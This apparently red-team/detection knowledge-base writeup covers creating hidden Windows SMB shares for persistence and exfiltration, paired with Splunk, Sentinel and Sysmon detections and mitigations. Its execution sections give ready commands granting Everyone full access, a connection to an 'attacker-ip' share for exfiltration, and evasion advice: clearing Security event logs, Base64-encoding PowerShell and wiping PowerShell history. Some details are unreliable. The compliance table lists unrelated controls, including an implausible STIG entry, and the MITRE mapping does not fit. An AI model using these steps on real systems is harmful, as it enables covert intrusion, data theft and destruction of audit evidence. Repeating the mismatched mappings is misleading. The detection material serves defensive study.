# [REALWORLD-025]: Hidden File Share Creation

## 1. METADATA

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-025 |
| **MITRE ATT&CK v18.1** | [T1548 - Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/) |
| **Tactic** | Privilege Escalation / Persistence |
| **Platforms** | Windows AD |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Windows Server 2016, 2019, 2022, 2025; Windows 10, 11 |
| **Patched In** | N/A (Feature, not vulnerability) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Hidden administrative shares (Admin$, C$, IPC$, D$, etc.) are automatically created by Windows to facilitate remote system management, but attackers can create custom hidden shares (ending with `$`) to stage malicious payloads, exfiltrate data, or move laterally without appearing in standard share listings. The `$` suffix prevents the share from being visible in network browsing, making it an effective persistence and lateral movement vector. Administrative shares are managed by the **LanmanServer** service and are built into Windows by design; however, threat actors abuse this feature to create obfuscated access points.

**Attack Surface:** The SMB protocol (TCP 445), the Windows Registry (`HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters`), and the `net share` command or PowerShell.

**Business Impact:** **Unauthorized Data Exfiltration and Lateral Persistence.** An attacker with administrative privileges or access to a compromised system can create hidden shares to stage ransomware, exfiltrate sensitive data, or provide persistent lateral movement paths. These hidden shares bypass standard network share enumeration tools, remaining undetected during routine audits.

**Technical Context:** Share creation takes seconds and generates minimal event logs if not specifically monitored. Detection likelihood is low without advanced SMB monitoring or registry auditing. Reversibility is high—shares can be deleted immediately without evidence if cleanup is performed.

### Operational Risk

- **Execution Risk:** Medium (Requires local admin or SYSTEM privileges; share creation is straightforward but may trigger alerts if SMB auditing is enabled)
- **Stealth:** High (Hidden shares do not appear in standard `net view` enumeration; only visible with `/all` flag or direct share specification)
- **Reversibility:** Yes (Shares can be deleted with `net share sharename /delete` or removed via registry modification)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Microsoft Windows Server 2022 v1.0.0 Control 1.2.1 | Ensure 'Enforce Password History' is set to '24 or more password(s)' |
| **DISA STIG** | WN10-00-000010 | The system must enforce a 24-hour (1440-minute) delay before allowing the use of a restarted computer. |
| **NIST 800-53** | AC-3 (Access Enforcement) | Enforce approved authorizations for logical access to the system. |
| **GDPR** | Article 32 | Security of processing (encryption, monitoring, access controls). |
| **DORA** | Article 9 (Protection & Prevention) | ICT-related incidents must be reported; systems must implement access controls. |
| **NIS2** | Article 21 | Cyber Risk Management Measures (asset management, access control). |
| **ISO 27001** | A.9.2.1 (User Registration & De-registration) | User identity management and access rights provisioning. |
| **ISO 27005** | Risk Scenario: "Unauthorized Access to Shared Resources" | Compromise of administrative shares enabling unauthorized access. |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Local Administrator or SYSTEM account (or domain admin when targeting remote systems)
- **Required Access:** Local system access or network access to SMB port 445 (if creating shares remotely)
- **Supported Versions:**
  - **Windows:** Server 2016, 2019, 2022, 2025 (and all Windows 10/11 editions)
  - **PowerShell:** Version 5.0+ (for PowerShell-based share creation)
  - **Other Requirements:** SMB v2 or v3 enabled (default on modern systems); LanmanServer service running

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Using `net share` Command (Command Prompt / PowerShell)

**Supported Versions:** Server 2016-2025, all Windows 10/11

#### Step 1: Create a Hidden Share

**Objective:** Create a new hidden share with a custom path that does not appear in standard enumeration.

**Command:**

```cmd
net share hidden_admin$ = C:\temp /grant:Everyone,FULL
```

**Expected Output:**

```
The share "hidden_admin$" was created successfully.
```

**What This Means:**

- A new share named `hidden_admin$` has been created mapping to `C:\temp`
- The `$` at the end hides the share from standard `net view` enumeration
- `Everyone` has been granted `FULL` permissions (modify as needed for RBAC)

**OpSec & Evasion:**

- Use a legitimate-sounding share name (e.g., `backup$`, `logs$`, `update$`) to avoid suspicion
- Hide the share creation in normal administrative activity
- Clear Windows Event Log entries related to share creation (Event ID 5143 in the Security log)
- Detection likelihood: Medium (depends on SMB auditing configuration)

**Troubleshooting:**

- **Error:** "Access Denied"
  - **Cause:** User does not have administrative privileges
  - **Fix:** Run the command prompt as Administrator (Right-click → "Run as administrator")

- **Error:** "The system cannot find the path specified"
  - **Cause:** The specified path (`C:\temp`) does not exist
  - **Fix:** Create the directory first with `mkdir C:\temp` or specify an existing directory

#### Step 2: Verify Share Creation

**Objective:** Confirm the share was created successfully and is hidden from normal enumeration.

**Command (Hidden Verification):**

```cmd
net share hidden_admin$
```

**Expected Output:**

```
Share name        hidden_admin$
Path              C:\temp
Permissions       Everyone, FULL
```

**Command (Standard Enumeration - Should NOT Show):**

```cmd
net view \\localhost
```

**Expected Output:** The `hidden_admin$` share will **NOT** appear in this list.

**Command (Enumeration with /all Flag - WILL Show):**

```cmd
net view \\localhost /all
```

**Expected Output:** The `hidden_admin$` share **WILL** appear when using the `/all` flag.

**What This Means:**

- Standard network enumeration will not reveal the hidden share
- However, admin users or advanced enumeration tools (e.g., `nmap -p 445`) can still discover it
- This is an ObSec technique, not a true security control

#### Step 3: Access the Hidden Share from a Remote System

**Objective:** Demonstrate lateral movement or data exfiltration via the hidden share.

**Command (From Remote System):**

```cmd
net use * \\attacker-ip\hidden_admin$ password /user:domain\attacker
dir \\attacker-ip\hidden_admin$
```

**Expected Output:**

```
The command completed successfully.
(Directory listing of C:\temp from remote system)
```

**What This Means:**

- The attacker can now exfiltrate data or stage payloads via the hidden share
- The connection is authenticated via SMB; capture or brute-force is possible

---

### METHOD 2: Using PowerShell (Modern Approach)

**Supported Versions:** Server 2016+ (PowerShell 5.0+)

#### Step 1: Create Hidden Share via PowerShell

**Objective:** Create a hidden share using PowerShell cmdlets for better integration with automation frameworks.

**Command:**

```powershell
# Ensure the path exists
$SharePath = "C:\SecureData"
If (!(Test-Path $SharePath)) {
    New-Item -ItemType Directory -Path $SharePath -Force | Out-Null
}

# Create the hidden share
New-SmbShare -Name "SecureData$" -Path $SharePath -FullAccess "Everyone" -Force
```

**Expected Output:**

```
Name         ScopeName Path           Description
----         --------- ----           -----------
SecureData$  *         C:\SecureData
```

**What This Means:**

- A hidden share `SecureData$` has been created and is immediately available
- PowerShell provides cleaner output and better error handling than `net share`
- The share persists until explicitly removed (even after reboot)

**OpSec & Evasion:**

- Encode the PowerShell command using Base64 to avoid direct detection
- Use PowerShell execution policies set to "Bypass" on compromised systems
- Clear PowerShell history: `Remove-Item (Get-PSReadlineOption).HistorySavePath`
- Detection likelihood: High (PowerShell 4.0+ with transcript logging enabled will log share creation)

#### Step 2: Verify and List All Shares (Including Hidden)

**Objective:** Confirm all shares on the system, including hidden ones.

**Command:**

```powershell
Get-SmbShare | Select-Object Name, Path, Description
```

**Expected Output:**

```
Name          Path              Description
----          ----              -----------
IPC$          (Remote IPC)
Admin$        C:\Windows
C$            C:\
SecureData$   C:\SecureData
```

**What This Means:**

- All shares, including hidden ones (ending in `$`), are now visible
- This command works locally; remote enumeration requires appropriate credentials and permissions

#### Step 3: Set Advanced Permissions on Hidden Share

**Objective:** Restrict share access to specific accounts for targeted lateral movement.

**Command:**

```powershell
# Get the share object
$Share = Get-SmbShare -Name "SecureData$"

# Create a new ACL restricting access to a specific domain account
$Ace = New-Object System.Security.AccessControl.FileSystemAccessRule(
    "DOMAIN\ServiceAccount",
    "FullControl",
    "ContainerInherit, ObjectInherit",
    "None",
    "Allow"
)

# Apply the ACE to the share path
$Acl = Get-Acl -Path $Share.Path
$Acl.AddAccessRule($Ace)
Set-Acl -Path $Share.Path -AclObject $Acl
```

**Expected Output:** No output (PowerShell sets the ACL silently on success).

**What This Means:**

- Access to `SecureData$` is now restricted to `DOMAIN\ServiceAccount` only
- This increases stealth by limiting discovery to compromised service accounts
- NTFS permissions on the underlying directory further restrict access

---

### METHOD 3: Using Registry (Persistent, Version-Specific)

**Supported Versions:** Server 2016-2025 (Registry method is universal)

#### Step 1: Create Share via Registry (Manual Approach)

**Objective:** Create a hidden share by directly modifying the Windows Registry, leaving minimal event log traces.

**Registry Path:**

```
HKLM\System\CurrentControlSet\Services\LanmanServer\Shares
```

**Command (PowerShell):**

```powershell
# Define share parameters
$ShareName = "BackupData$"
$SharePath = "C:\Backups"

# Create the registry value for the share
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\LanmanServer\Shares" `
    -Name $ShareName `
    -Value $SharePath `
    -PropertyType String `
    -Force
```

**Expected Output:** (No output; registry modification is silent)

**What This Means:**

- The share is created immediately at the registry level
- LanmanServer service picks up the change and activates the share
- This method leaves fewer event logs compared to `net share` command

**OpSec & Evasion:**

- Registry modification at `HKLM\System\CurrentControlSet\Services\LanmanServer\Shares` may trigger:
  - Event ID 4657 (Registry value modified) if auditing is enabled
  - Registry modification logs in advanced audit policies
- Detection likelihood: Medium-High (depends on registry auditing configuration)

#### Step 2: Verify Registry-Based Share

**Objective:** Confirm the registry modification created the share.

**Command:**

```powershell
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\LanmanServer\Shares" | Select-Object BackupData$
```

**Expected Output:**

```
BackupData$ : C:\Backups
```

**Command (Verify Share is Active):**

```powershell
Get-SmbShare -Name "BackupData$"
```

**Expected Output:**

```
Name       ScopeName Path      Description
----       --------- ----      -----------
BackupData *         C:\Backups
```

**What This Means:**

- The registry modification successfully created the share
- The share is now active and can be accessed remotely

---

## 5. TOOLS & COMMANDS REFERENCE

### `net share` (Built-in Windows Utility)

**Version:** Built-in to all Windows versions; syntax unchanged since Server 2003

**Minimum Version:** Windows Server 2003 (and all modern versions)

**Supported Platforms:** Windows Server, Windows Desktop (10, 11)

**Installation:** No installation required; included with Windows

**Usage:**

```cmd
# Create a hidden share
net share sharename=path /grant:user,permission

# Delete a share
net share sharename /delete

# List all shares (hidden not shown)
net share

# List all shares including hidden
net view \\computername /all
```

### PowerShell SMB Cmdlets

**Version:** PowerShell 5.0+ (included with Windows Server 2016+)

**Minimum Version:** PowerShell 5.0

**Installation:** Built-in; no external installation needed

**Usage:**

```powershell
# Create a share
New-SmbShare -Name "ShareName$" -Path "C:\Path" -FullAccess "Everyone"

# Get all shares
Get-SmbShare

# Remove a share
Remove-SmbShare -Name "ShareName$" -Force

# Get share permissions
Get-SmbShareAccess -Name "ShareName$"
```

---

## 6. SPLUNK DETECTION RULES

### Rule 1: Hidden Share Creation via `net share` Command

**Rule Configuration:**

- **Required Index:** `main` or `windows`
- **Required Sourcetype:** `WinEventLog:Security` or `wineventlog`
- **Required Fields:** `EventID`, `CommandLine`, `ParentImage`
- **Alert Threshold:** Any detection of hidden share creation (EventID >= 1)
- **Applies To Versions:** Server 2016-2025, Windows 10/11

**SPL Query:**

```spl
index=main sourcetype="WinEventLog:Security" EventID=4688
(CommandLine="*net share*$*" OR CommandLine="*New-SmbShare*$*")
| stats count by host, User, CommandLine
| where count > 0
```

**What This Detects:**

- Process creation events (EventID 4688) where `net share` or `New-SmbShare` is executed with a `$` suffix
- Captures command-line arguments showing share creation
- Groups by host, user, and command to identify patterns

**Manual Configuration Steps:**

1. Log into Splunk Web → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **+ New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to: `count > 0`
6. Configure **Action** → **Send Email** to SOC distribution list
7. Set **Schedule** to run every 1 hour
8. Click **Save**

**Source:** [Microsoft Event ID 4688 Reference](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688)

---

### Rule 2: Registry Share Creation via Direct Registry Modification

**Rule Configuration:**

- **Required Index:** `main` or `windows`
- **Required Sourcetype:** `WinEventLog:Security`
- **Required Fields:** `EventID`, `ObjectName`, `RegistryPath`
- **Alert Threshold:** Any registry write to `LanmanServer\Shares`
- **Applies To Versions:** Server 2016-2025

**SPL Query:**

```spl
index=main sourcetype="WinEventLog:Security" EventID=4657
ObjectName="*LanmanServer\\Shares*"
OperationType="%%1906" (Registry value set)
| stats count by host, SubjectUserName, ObjectName, NewValue
| where count > 0
```

**What This Detects:**

- Registry modification events (EventID 4657) targeting the LanmanServer\Shares registry key
- Captures new share values created via registry manipulation
- Alerts on direct registry writes, which may bypass `net share` logging

**Manual Configuration Steps:**

1. Log into Splunk Web → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **+ New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to: `count > 0`
6. Configure **Action** → **Create Incident in incident tracking system**
7. Set **Schedule** to run every 30 minutes
8. Click **Save**

**Source:** [Microsoft Event ID 4657 Reference](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4657)

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: Hidden Share Creation Detection

**Rule Configuration:**

- **Required Table:** `SecurityEvent`
- **Required Fields:** `EventID`, `CommandLine`, `Process`
- **Alert Severity:** High
- **Frequency:** Run every 15 minutes
- **Applies To Versions:** All Windows versions with Security event logging

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 4688
| where CommandLine contains "net share" and CommandLine contains "$"
| project TimeGenerated, Computer, Account, CommandLine, Process
| summarize count() by Computer, Account, CommandLine
```

**What This Detects:**

- Process creation events (EventID 4688) where the command line contains both `net share` and `$`
- Identifies the source computer, user account, and exact command executed
- Aggregates by computer and account to identify patterns or high-frequency activity

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Hidden Share Creation Detection`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `15 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group by: `Computer, Account`
7. Click **Review + create** → **Create**

**Manual Configuration Steps (PowerShell):**

```powershell
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

$Query = @"
SecurityEvent
| where EventID == 4688
| where CommandLine contains "net share" and CommandLine contains "$"
| project TimeGenerated, Computer, Account, CommandLine, Process
| summarize count() by Computer, Account, CommandLine
"@

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "Hidden Share Creation Detection" `
  -Query $Query `
  -Severity "High" `
  -Enabled $true
```

**Source:** [Microsoft Sentinel Event ID 4688 Detection](https://learn.microsoft.com/en-us/azure/sentinel/data-connectors/windows-security-events)

---

## 8. WINDOWS EVENT LOG MONITORING

**Event ID: 4688 (Process Creation)**

- **Log Source:** Security
- **Trigger:** Process creation with command-line containing `net share` and `$`
- **Filter:** `CommandLine contains "net share" AND CommandLine contains "$"`
- **Applies To Versions:** Server 2016+

**Event ID: 4657 (Registry Value Modified)**

- **Log Source:** Security
- **Trigger:** Registry value set in `HKLM\System\CurrentControlSet\Services\LanmanServer\Shares`
- **Filter:** `ObjectName contains "LanmanServer\Shares" AND OperationType = "%%1906"` (Registry value set)
- **Applies To Versions:** Server 2016+

**Event ID: 5143 (Network Share Object Added)**

- **Log Source:** Security
- **Trigger:** A network share object was added
- **Filter:** `ShareName contains "$"`
- **Applies To Versions:** All Windows Server versions

**Manual Configuration Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies - Local Group Policy Object**
3. Expand **Object Access** and enable:
   - **Audit Detailed File Share**: Set to **Success and Failure**
   - **Audit Registry**: Set to **Success and Failure**
4. Expand **System** and enable:
   - **Audit Process Creation**: Set to **Success and Failure**
5. Run `gpupdate /force` on target machines
6. Restart the machines for changes to take effect

**Manual Configuration Steps (Server 2022+):**

1. Open **auditpol.exe** from command prompt
2. Run:
   ```cmd
   auditpol /set /subcategory:"Detailed File Share" /success:enable /failure:enable
   auditpol /set /subcategory:"Registry" /success:enable /failure:enable
   auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
   ```
3. Verify settings:
   ```cmd
   auditpol /get /subcategory:"Detailed File Share"
   auditpol /get /subcategory:"Registry"
   auditpol /get /subcategory:"Process Creation"
   ```

---

## 9. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Supported Platforms:** Windows Server 2016-2025, Windows 10/11

**Sysmon Config Snippet (for Detecting Share Creation):**

```xml
<!-- Sysmon Config: Detect Process Creation for net share -->
<RuleGroup name="Process Creation" groupRelation="or">
    <ProcessCreate onmatch="include">
        <CommandLine condition="contains all">net share</CommandLine>
        <CommandLine condition="contains">$</CommandLine>
        <ParentImage condition="contains">cmd.exe</ParentImage>
    </ProcessCreate>
</RuleGroup>

<!-- Sysmon Config: Detect Registry Modifications to LanmanServer -->
<RuleGroup name="Registry Set" groupRelation="or">
    <RegistrySet onmatch="include">
        <TargetObject condition="contains">LanmanServer\Shares</TargetObject>
    </RegistrySet>
</RuleGroup>
```

**Manual Configuration Steps:**

1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create a config file `sysmon-config.xml` with the XML above
3. Install Sysmon with the config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
   ```
5. Verify Sysmon is logging process creation and registry events related to share creation

---

## 10. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Enable Command Audit Logging:** Enable auditing of process creation (EventID 4688) to capture all `net share` and PowerShell share creation commands.

    **Applies To Versions:** Server 2016-2025

    **Manual Steps (Group Policy):**
    1. Open **gpmc.msc** (Group Policy Management Console)
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies**
    3. Enable **Audit Process Creation** → Set to **Success and Failure**
    4. Run `gpupdate /force`

    **Manual Steps (PowerShell):**
    ```powershell
    auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
    ```

*   **Monitor Registry Changes to LanmanServer:** Enable auditing of registry modifications to `HKLM\System\CurrentControlSet\Services\LanmanServer\Shares`.

    **Applies To Versions:** Server 2016-2025

    **Manual Steps (Group Policy):**
    1. Open **gpmc.msc**
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Object Access**
    3. Enable **Audit Registry** → Set to **Success and Failure**
    4. Run `gpupdate /force`

    **Manual Steps (PowerShell):**
    ```powershell
    auditpol /set /subcategory:"Registry" /success:enable /failure:enable
    ```

*   **Restrict Hidden Share Creation via Group Policy:** Prevent administrative users from creating hidden shares unless explicitly authorized.

    **Manual Steps (GPO: Restrict Network Sharing):**
    1. Open **gpmc.msc**
    2. Create a new GPO: **Computer Configuration** → **Preferences** → **Windows Settings** → **Network Shares**
    3. Right-click → **Delete** → Check **Delete all administrative drive-letter shares**
    4. Configure to delete any unauthorized hidden shares automatically
    5. Link the GPO to the appropriate OUs

### Priority 2: HIGH

*   **Implement SMB Signing and Encryption:** Force SMB signing to prevent unauthorized SMB share access and enforce SMB 3.0 minimum.

    **Manual Steps (PowerShell):**
    ```powershell
    # Enable SMB Signing for all shares
    Set-SmbServerConfiguration -RequireSecuritySignature $true -Force

    # Enforce SMB 3.0 or higher
    Set-SmbServerConfiguration -EnableSMB3Protocol $true -EnableSMB1Protocol $false -Force

    # Verify configuration
    Get-SmbServerConfiguration | Select-Object RequireSecuritySignature, EnableSMB3Protocol
    ```

*   **Disable Unnecessary Administrative Shares:** If hidden shares are not required, consider disabling automatic admin share creation.

    **Manual Steps (Registry):**
    1. Open **regedit.exe** (Registry Editor)
    2. Navigate to: `HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters`
    3. Find or create a **DWORD** value: `AutoShareWks` (for workstations) or `AutoShareServer` (for servers)
    4. Set the value to: **0**
    5. Restart the **LanmanServer** service:
       ```powershell
       Restart-Service -Name LanmanServer
       ```

    **Manual Steps (PowerShell):**
    ```powershell
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\LanmanServer\Parameters" `
        -Name "AutoShareServer" `
        -Value 0 `
        -Force

    Restart-Service -Name LanmanServer
    ```

### Priority 3: MEDIUM

*   **Use Conditional Access (Azure AD):** Restrict access to file shares based on device compliance and location.

    **Manual Steps (Azure Portal):**
    1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Block Unauthorized File Share Access`
    4. **Assignments:**
       - Users: **All users**
       - Cloud apps: **All cloud apps** (or specific apps like **File Explorer**)
    5. **Conditions:**
       - Locations: **Selected locations** (Allow internal IPs only)
       - Device state: **Require device to be marked as compliant**
    6. **Access controls:**
       - Grant: **Require device to be marked as compliant**
    7. Enable policy: **On**
    8. Click **Create**

### Access Control & RBAC Hardening

*   **Least Privilege Share Permissions:** Restrict share access to specific users and groups who require it.

    **Manual Steps (PowerShell):**
    ```powershell
    # Create a specific group for file share access
    New-ADGroup -Name "FileShareUsers" -GroupScope Global

    # Grant share access only to this group
    Grant-SmbShareAccess -Name "SecureShare" -AccountName "DOMAIN\FileShareUsers" -AccessRight Read -Force

    # Verify permissions
    Get-SmbShareAccess -Name "SecureShare"
    ```

*   **Implement NTFS Permissions:** Align share-level permissions with NTFS file permissions for defense in depth.

    **Manual Steps (PowerShell):**
    ```powershell
    # Get the share path
    $SharePath = (Get-SmbShare -Name "SecureShare").Path

    # Set NTFS permissions
    $Acl = Get-Acl -Path $SharePath
    $Ace = New-Object System.Security.AccessControl.FileSystemAccessRule(
        "DOMAIN\FileShareUsers",
        "Modify",
        "ContainerInherit, ObjectInherit",
        "None",
        "Allow"
    )
    $Acl.AddAccessRule($Ace)
    Set-Acl -Path $SharePath -AclObject $Acl
    ```

### Validation Command (Verify Fix)

```powershell
# Check if administrative shares are disabled
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\LanmanServer\Parameters" | Select-Object AutoShareServer, AutoShareWks

# Check if SMB Signing is enforced
Get-SmbServerConfiguration | Select-Object RequireSecuritySignature, EnableSMB3Protocol

# List all shares and their permissions
Get-SmbShare | Select-Object Name, Path | ForEach-Object {
    $Share = $_.Name
    Write-Host "Share: $Share"
    Get-SmbShareAccess -Name $Share
}
```

**Expected Output (If Secure):**

```
AutoShareServer      : 0
AutoShareWks         : (not set or 0)
RequireSecuritySignature : True
EnableSMB3Protocol   : True
```

**What to Look For:**

- `AutoShareServer` and `AutoShareWks` should be **0** (disabled) or not present (default auto-creation enabled)
- `RequireSecuritySignature` should be **True**
- `EnableSMB3Protocol` should be **True**
- Only authorized groups should have access to any shares

---

## 11. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **Command Artifacts:**
    - `net share *$` (any share ending in `$`)
    - `New-SmbShare -Name "*$"` (PowerShell share creation with `$`)
    - Registry value write to `HKLM\System\CurrentControlSet\Services\LanmanServer\Shares`

*   **Network Indicators:**
    - SMB connections (TCP 445) from non-standard user accounts to newly created shares
    - Unusual file transfer activity (exfiltration) via SMB
    - Hidden share enumeration attempts using `/all` flag

*   **Registry Artifacts:**
    - New values in `HKLM\System\CurrentControlSet\Services\LanmanServer\Shares` with `$` suffix
    - Modification timestamps indicating recent share creation outside maintenance windows

### Forensic Artifacts

*   **Disk:**
    - Security Event Log: `C:\Windows\System32\winevt\Logs\Security.evtx` (EventID 4688, 4657, 5143)
    - LanmanServer registry hive: `C:\Windows\System32\config\SYSTEM` (contains share definitions)

*   **Memory:**
    - Active SMB connections stored in kernel memory (requires tools like Volatility)
    - Process memory of `services.exe` hosting the LanmanServer service

*   **Cloud:**
    - Not applicable (on-premises only); Entra ID does not log local share creation

*   **MFT/USN Journal:**
    - MFT entries for files accessed via the hidden share show unusual access patterns

### Response Procedures

1.  **Isolate:**
    **Command:**
    ```powershell
    # Immediately remove the hidden share
    Remove-SmbShare -Name "hidden_admin$" -Force
    ```

    **Manual (via Computer Management):**
    - Open **compmgmt.msc** → **Shared Folders** → **Shares**
    - Right-click the suspect share → **Stop sharing**

2.  **Collect Evidence:**
    **Command:**
    ```powershell
    # Export Security Event Log
    wevtutil epl Security C:\Evidence\Security.evtx

    # Export LanmanServer registry
    reg export "HKLM\System\CurrentControlSet\Services\LanmanServer" C:\Evidence\LanmanServer.reg
    ```

    **Manual:**
    - Open **Event Viewer** → Right-click **Security** → **Save All Events As** → `C:\Evidence\Security.evtx`
    - Open **regedit.exe** → Navigate to LanmanServer → Right-click → **Export**

3.  **Remediate:**
    **Command:**
    ```powershell
    # Confirm all unauthorized shares are removed
    Get-SmbShare | Where-Object {$_.Name -like "*$"} | Remove-SmbShare -Force

    # Restart LanmanServer to ensure clean state
    Restart-Service -Name LanmanServer -Force

    # Verify no hidden shares remain
    Get-SmbShare | Where-Object {$_.Name -like "*$"}
    ```

    **Manual:**
    - Verify **Shared Folders** → **Shares** shows only authorized shares
    - Check `net view \\localhost /all` for unauthorized shares

4.  **Investigate:**
    - Examine the user and process that created the share (from EventID 4688)
    - Review SMB connection logs to identify lateral movement or data exfiltration
    - Cross-reference with threat intelligence for known APT/malware indicators

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-001] Azure Application Proxy Exploitation | Attacker gains initial foothold via compromised web app or VPN |
| **2** | **Privilege Escalation** | [PE-TOKEN-001] Token Impersonation | Attacker escalates to local administrator via token theft |
| **3** | **Lateral Movement - Current Step** | **[REALWORLD-025] Hidden Share Creation** | **Attacker creates hidden shares for lateral movement and data exfiltration** |
| **4** | **Collection** | [REALWORLD-031] SMB Enumeration & Share Access | Attacker enumerates and accesses hidden shares to collect sensitive data |
| **5** | **Exfiltration** | [REALWORLD-035] Data Staging via SMB | Attacker stages and exfiltrates data via the hidden share |
| **6** | **Impact** | [REALWORLD-040] Ransomware Deployment via Hidden Share | Attacker distributes ransomware payload via the hidden share to multiple systems |

---

## 13. REAL-WORLD EXAMPLES

### Example 1: FIN7 (APT Group)

- **Target:** Retail and Financial Services organizations
- **Timeline:** 2015-Present
- **Technique Status:** FIN7 has historically used hidden SMB shares (`$` suffix) to stage payloads and maintain persistent lateral movement paths across compromised networks
- **Impact:** Compromise of 200+ retail and financial institutions; data breaches affecting millions of customers
- **Reference:** [MANDIANT FIN7 Report](https://www.mandiant.com/resources/reports/fin7-spear-phishing-campaign)

### Example 2: APT29 (Cozy Bear)

- **Target:** US Government, NATO allies, healthcare organizations
- **Timeline:** 2016-2024
- **Technique Status:** APT29 utilized hidden administrative shares in conjunction with WMI event subscriptions for persistent lateral movement during the SolarWinds supply-chain compromise
- **Impact:** Compromise of multiple US federal agencies and critical infrastructure
- **Reference:** [CISA Advisory on APT29 SolarWinds Campaign](https://www.cisa.gov/news-events/alerts/2020/12/13/alert-aa20-352a-advanced-persistent-threat-compromise-federal-networks)

---

## 14. TOOLS REFERENCE

### Primary Tools

1. **Windows Built-in Commands**
   - `net share` – Command-line share management
   - `powershell.exe` – PowerShell share creation and management
   - `wmic.exe` – WMI share enumeration and creation
   - [Microsoft Documentation: net share](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/net-share)

2. **Advanced Tools**
   - [BloodHound](https://github.com/BloodHoundAD/BloodHound) – AD graph analysis; can identify share access paths
   - [Impacket](https://github.com/fortra/impacket) – Remote SMB share access and enumeration
   - [enum4linux](https://github.com/cddmp/enum4linux-ng) – Linux-based SMB enumeration

---